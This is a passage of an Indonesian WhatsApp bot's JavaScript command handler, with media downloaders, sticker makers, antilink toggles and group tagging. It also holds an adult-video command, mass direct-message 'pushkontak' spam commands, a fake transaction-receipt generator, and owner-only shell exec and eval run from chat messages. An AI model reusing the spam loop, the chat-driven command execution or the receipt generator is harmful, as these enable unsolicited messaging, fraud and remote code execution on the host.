        Denzy.sendMessage(m.chat, { video: { url: anu1 }, caption: "Nih Bang Bokepnya" }, { quoted: m });
    } catch (err) {
        reply("Terjadi Kesalahan Saat Mengambil Data")
    }
}
break
case 'wangy': {
				if (!q) return reply(`Contoh : ${prefix}wangy Elaina`)
				qq = q.toUpperCase()
				awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
				reply(awikwok)
			}
			break
			case 'sayang': {
				if (!q) return reply(`Contoh : ${prefix}sayang Elaina`)
				qq = q.toUpperCase()
				awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ AKU SAYANG KAMUUU ${qq} SAYANG BANGET MAU GA NIKAH AMA GW ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di Sekolah juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
				reply(awikwok)
			}
			break
case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
 if (!text) return reply(`Gunakan: ${prefix + command} <url> [resolusi]`); 
 let url = args[0]; 
 let resolution = args[1] && !isNaN(args[1]) ? args[1] : "720"; 
 try { 
 await Denzy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 let info = await getVideoInfo(url);
 if (!info || !info.status) return reply('❌ Gagal mendapatkan informasi video.');
 await Denzy.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
 let video = await downloadVideo(url, resolution);
 if (!video.status || !video.downloadUrl) return reply('❌ Gagal mendapatkan file video.');
 let captionInfo = `📹 *${info.title}*\n👤 *Creator:* ${info.creator}\n⏳ *Durasi:* ${info.duration} detik\n📡 *Sumber:* ${video.source}\n🎥 *Resolusi:* ${resolution}p\n🔗 *URL:* ${info.url}`;
 await Denzy.sendMessage(m.chat, {
 image: { url: info.thumbnail },
 caption: captionInfo
 }, { quoted: m });
 await Denzy.sendMessage(m.chat, { react: { text: '📤', key: m.key } });
 let fileSize = await getFileSizeFromUrl(video.downloadUrl);
 let captionMedia = `📹 *${info.title}*\n👤 *${info.creator}*\n📡 *Sumber:* ${video.source}`;
 if (fileSize > 15 * 1024 * 1024) {
 await Denzy.sendMessage(m.chat, { 
 document: { url: video.downloadUrl },
 mimetype: 'video/mp4',
 fileName: `${info.title}.mp4`,
 caption: captionMedia
 }, { quoted: m });
 } else {
 await Denzy.sendMessage(m.chat, { 
 video: { url: video.downloadUrl },
 caption: captionMedia,
 fileName: `${info.title}.mp4`
 }, { quoted: m });
 }
 await Denzy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) { 
 console.error(err); 
 reply('❌ Terjadi kesalahan.'); 
 } 
} 
break
case "playspotify": case "plays": case "playsp": {
if (!text) return Reply(example("intro ariana"))
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})

var anu = await fetchJson("https://restapi.simplebot.my.id/api/download/playspotify?q="+text)

if (anu.result.download.link) {
let urlMp3 = anu.result.download.link
await Denzy.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qkontak})
} else {
return Reply("Error! vidio atau lagu tidak ditemukan")
}
}
break
case "yts": {
if (!text) return Reply(example('we dont talk'))
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await Reply(teks)
}
break
case "ytmp3": {
if (!text) return Reply(example("linknya"))
if (!text.startsWith("https://")) return Reply("Link Tautan Tidak Valid")
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await Denzy.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: qkontak})
} else {
return Reply("Error! vidio atau lagu tidak ditemukan")
}
}
break
            case "play1":{
                if (!text) return reply(`\n*ex:* ${prefix + command} impossible\n`)
                await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                Denzy.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: qkontak })
            }
            break
                //// BETA
            case "public":{
                if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m}) 
                Denzy.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            case 'done': {

    let t = text.split(',');

    if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,sistem`);
    
    let barang = t[0];
    let nominal = t[1];
    let sistem = t[2];
    
    reply(`╔════════════════════╗
     *TRANSAKSI BERHASIL*  
          BY *${global.nama}*
╚════════════════════╝

📦 *Barang:* ${barang}  
💵 *Nominal:* Rp${nominal}  
🔧 *Sistem:* ${sistem}  
🏢 *Nama Store:* ${global.owner}

━━━━━━━━━━━━

🙏 *TERIMA KASIH TELAH ORDER DI ${global.nama}*  
🔁 *JANGAN LUPA ORDER LAGI YA!*  


*🪷TESTIMONI SALURAN :* ${global.ch}

━━━━━━━━━━━━`);
}
break;
case "cekidgc": {

    // Cek jika pengguna adalah Creator

    if (!isDenzyCreator) return reply("Fitur ini hanya bisa digunakan oleh Creator bot!");

    try {
        let getGroups = await Denzy.groupFetchAllParticipating();
        let groups = Object.entries(getGroups).map((entry) => entry[1]);
        let anu = groups.map((v) => v.id);

        let teks = `⬣ *LIST GROUP BY ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ*\n\nTotal Group: ${anu.length} Group\n\n`;

        for (let x of anu) {
            try {
                let metadata2 = await Denzy.groupMetadata(x);
                teks += `◉ Nama: ${metadata2.subject}\n◉ ID: ${metadata2.id}\n◉ Member: ${metadata2.participants.length}\n\n────────────────────────\n\n`;
            } catch (e) {
                teks += `◉ [Gagal mengambil data group ID: ${x}]\n\n`;
            }
        }

        reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`);
    } catch (error) {
        console.error(error);
        reply("Terjadi kesalahan saat mengambil data group. Silahkan coba lagi nanti.");
    }
}
break;
case 'brat': {
if (!text) return Reply(`\n*ex:* ${prefix + command} apanih cok\n`)
Denzy.sendMessage(m.chat, {  text: `𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘗𝘪𝘭𝘪𝘩 𝘛𝘺𝘱𝘦 𝘉𝘳𝘢𝘵 𝘠𝘢𝘯𝘨 𝘛𝘦𝘳𝘴𝘦𝘥𝘪𝘢 𝘋𝘪 𝘉𝘢𝘸𝘢𝘩 𝘐𝘯𝘪`,
image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' },
caption: text,
footer: `${global.foother}`,
buttons: [
{
buttonId: `${prefix}brt ${text}`,
buttonText: {
displayText: "𝘉𝘳𝘢𝘵 𝘐𝘮𝘢𝘨𝘦𖤓"
}
},
{
buttonId: `${prefix}brt1 ${text}`,
buttonText: {
displayText: "𝘉𝘳𝘢𝘵 𝘝𝘪𝘥𝘦𝘰𖤓"
}
}
],
viewOnce: true,
}, {
quoted: qkontak
});
                    await sleep(200)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
break
case "brt": {
if (!text) return Reply(`\n*ex:* ${prefix + command} apanih cok\n`)
  const media = `https://brat.caliphdev.com/api/brat?text=${text}`;
  await reaction(m.chat, "💔")

  Denzy.sendImageAsSticker(m.chat, media, m, {
    packname: packname,
    author: author
  });
}
break
case "brt1": {
if (!text) return Reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
try {
await Denzy.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
const response = await axios.get(url, { responseType: "arraybuffer" });
const sticker = new Sticker(response.data, {
pack: "Stiker By",
mauthor: "ᴋᴏᴛᴏʀɪ",
type: "image/png",
});
const stikerBuffer = await sticker.toBuffer();
await Denzy.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
} catch (err) {
console.error("Error:", err);
await Denzy.sendMessage(m.chat, {
text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
}, { quoted: m });
}
}
break

case "antilink3": {
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return reply("*Antilink2* Di Grup Ini Sudah Aktif!")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./command/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./command/antilink.json", JSON.stringify(antilink))
reply("Berhasil Menyalakan *Antilink2* Di Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return reply("*Antilink* Di Grup Ini Belum Aktif!")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./command/antilink.json", JSON.stringify(antilink))
reply("Berhasil Mematikan *Antilink2* Di Grup Ini")
} else {
return reply("on/off")
}}
break
case "antilink4": {
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return reply("*Antilink* Di Grup Ini Sudah Aktif!")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./command/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./command/antilink2.json", JSON.stringify(antilink2))
reply("Berhasil Menyalakan *Antilink* Di Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return reply("*Antilink* Di Grup Ini Belum Aktif!")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./command/antilink2.json", JSON.stringify(antilink2))
reply("Berhasil Mematikan *Antilink* Di Grup Ini")
} else {
return reply("on/off")
}}
break
case "antilink5": {
if (!m.isGroup) return reply('Fitur Khusus Group!!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (/on/.test(args[0].toLowerCase())) {
if (Antilinkall.includes(m.chat)) return reply("*AntilinkAll* Di Grup Ini Sudah Aktif!")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./command/antilinkall.json", JSON.stringify(antilink))
}
Antilinkall.push(m.chat)
await fs.writeFileSync("./command/antilinkall.json", JSON.stringify(Antilinkall))
reply("Berhasil Menyalakan *Antilinkall* Di Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!Antilinkall.includes(m.chat)) return reply("*AntilinkAll* Di Grup Ini Belum Aktif!")
let posi = Antilinkall.indexOf(m.chat)
Antilinkall.splice(posi, 1)
await fs.writeFileSync("./command/antilinkall.json", JSON.stringify(Antilinkall))
reply("Berhasil Mematikan *AntilinkAll* Di Grup Ini")
} else {
return reply("on/off")
}}
break
case 'antilink2': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let mde = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘛𝘰 𝘌𝘯𝘢𝘣𝘭𝘦 𝘖𝘳 𝘋𝘪𝘴𝘢𝘣𝘭𝘦 𝘈𝘯𝘵𝘪𝘭𝘪𝘯𝘬 𝘝2

> ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: '𝘚𝘊𝘙𝘐𝘗𝘛' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
          sections: [
            {
              title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝘌𝘕𝘈𝘉𝘓𝘌',
                  id: `.antilink3 on`
                },
                {
                  title: '𝘋𝘐𝘚𝘈𝘉𝘓𝘌',
                  id: `.antilink3 off`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' },
      caption: mde,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: '© 𝘋𝘌𝘕𝘡𝘠 𝘖𝘍𝘍𝘊',
      thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
                    }
break
case 'antilink': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let mde = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘛𝘰 𝘌𝘯𝘢𝘣𝘭𝘦 𝘖𝘳 𝘋𝘪𝘴𝘢𝘣𝘭𝘦 𝘈𝘯𝘵𝘪𝘭𝘪𝘯𝘬

> ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: '𝘚𝘊𝘙𝘐𝘗𝘛' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
          sections: [
            {
              title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝘌𝘕𝘈𝘉𝘓𝘌',
                  id: `.antilink4 on`
                },
                {
                  title: '𝘋𝘐𝘚𝘈𝘉𝘓𝘌',
                  id: `.antilink4 off`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' },
      caption: mde,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: '© 𝘋𝘌𝘕𝘡𝘠 𝘖𝘍𝘍𝘊',
      thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
                    }
break
case 'antilinkall': {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let mde = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘛𝘰 𝘌𝘯𝘢𝘣𝘭𝘦 𝘖𝘳 𝘋𝘪𝘴𝘢𝘣𝘭𝘦 𝘈𝘯𝘵𝘪𝘭𝘪𝘯𝘬 𝘈𝘭𝘭

> ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: '𝘚𝘊𝘙𝘐𝘗𝘛' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
          sections: [
            {
              title: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝘌𝘕𝘈𝘉𝘓𝘌',
                  id: `.antilink5 on`
                },
                {
                  title: '𝘋𝘐𝘚𝘈𝘉𝘓𝘌',
                  id: `.antilink5 off`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' },
      caption: mde,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: '© 𝘋𝘌𝘕𝘡𝘠 𝘖𝘍𝘍𝘊',
      thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
                    }
break
            case 'pushkontak': {

    if (!isGroup) return reply('Fitur ini hanya dapat digunakan di grup.');

    if (!isDenzyCreator) return reply('Hanya owner yang dapat menggunakan fitur ini.');

    const groupMetadata = await Denzy.groupMetadata(from);
    const participants = groupMetadata.participants;

    if (!text) return reply('Silakan masukkan pesan yang ingin dikirim.');

    const pesan = text.trim(); 
    let success = 0;
    let failed = 0;

    for (let member of participants) {
        const memberId = member.id; 
        try {
            // Kirim pesan ke anggota grup
            await Denzy.sendMessage(memberId, { text: pesan });
            console.log(`Pesan berhasil dikirim ke: ${memberId}`);
            success++;
        } catch (error) {
            console.error(`Gagal mengirim pesan ke: ${memberId}`, error);
            failed++;
        }
        await sleep(global.delayPushkontak);
    }

    reply(`Push pesan selesai.\nBerhasil: ${success}\nGagal: ${failed}`);
    break;
}
case 'pushkontakid': {

    if (!isDenzyCreator) return reply('Fitur ini hanya dapat digunakan oleh owner.');


    const args = text.split('|');
    if (args.length < 2) return reply(`Gunakan format:\n${prefix}pushkontakid <id_grup>|<pesan>\n\nContoh:\n${prefix}pushkontakid 1234567890123456789@g.us|Woi Jawir`);

    const groupId = args[0].trim(); 
    const pesan = args[1].trim(); 
    try {
        const groupMetadata = await Denzy.groupMetadata(groupId);
        const participants = groupMetadata.participants;

        let success = 0;
        let failed = 0;

        for (let member of participants) {
            const memberId = member.id; 
            try {
                await Denzy.sendMessage(memberId, { text: pesan });
                console.log(`Pesan berhasil dikirim ke: ${memberId}`);
                success++;
            } catch (error) {
                console.error(`Gagal mengirim pesan ke: ${memberId}`, error);
                failed++;
            }
            await sleep(global.delayPushkontak);
        }

        reply(`Push pesan selesai.\nBerhasil: ${success}\nGagal: ${failed}`);
    } catch (error) {
        console.error(error);
        reply('Gagal mendapatkan metadata grup. Pastikan ID grup benar dan bot ada di dalam grup tersebut.');
    }
    break;
}
            case "self":{
                if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m}) 
                Denzy.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                
            case 'tagall':{
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return Reply("Only Grup");
                
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;

                const groupMetadata = await Denzy.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                Denzy.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: qkontak });
            }
            break         
            
            case "h": {
                if (!m.isGroup) return Reply("Only Grup")
                if (!isAdmins && !isDenzyCreator) return reply(mess.admin)
                if (m.quoted) {
                    Denzy.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    Denzy.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: qkontak })
                }
            }
            break
              
            default:
                if (budy.startsWith('$')) {
                    if (!isDenzyCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isDenzyCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isDenzyCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})